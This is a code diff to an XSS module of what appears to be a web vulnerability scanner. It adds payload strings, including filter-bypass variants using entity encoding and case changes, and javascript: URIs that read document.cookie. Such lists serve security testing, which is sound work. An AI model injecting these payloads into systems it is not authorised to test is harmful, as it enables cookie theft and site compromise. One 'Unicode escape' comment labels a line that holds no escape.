@@ -9,6 +9,7 @@ class XSSModule(BaseModule):
 
     def run(self):
         payloads = [
+            # Reflected XSS
             'xploit"><svg/onload=alert(1)>',
             'xploit"><img src=x onerror=alert(1)>',
             'xploit\'><script>alert(1)</script>',
@@ -19,7 +20,19 @@ class XSSModule(BaseModule):
             'xploit"><video><source onerror=alert(1)>',
             'xploit"><body onload=alert(1)>',
             'xploit"><marquee onstart=alert(1)>',
+            # DOM-based XSS patterns
+            '<img src=x onerror=alert(document.domain)>',
+            'javascript:alert(document.cookie)',
+            '<svg onload=alert(1)>',
+            # Filter bypass techniques
+            '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',  # HTML entity encoding
+            '<IMG SRC=x OnErRoR=alert(1)>',  # Case variation
+            '<img src=x onerror=alert(1)>',  # Unicode escape
+            '<img src=x onerror=alert(1)>',
+            # Advanced XSS
             'xploit"><math><mtext><option><annotation encoding="text/html"><svg/onload=alert(1)></annotation></option></mtext></math>',
+            '<object data="javascript:alert(1)">',
+            '<embed src="javascript:alert(1)">',
         ]
         for payload in payloads:
             for url in list(self.scanner.pages):
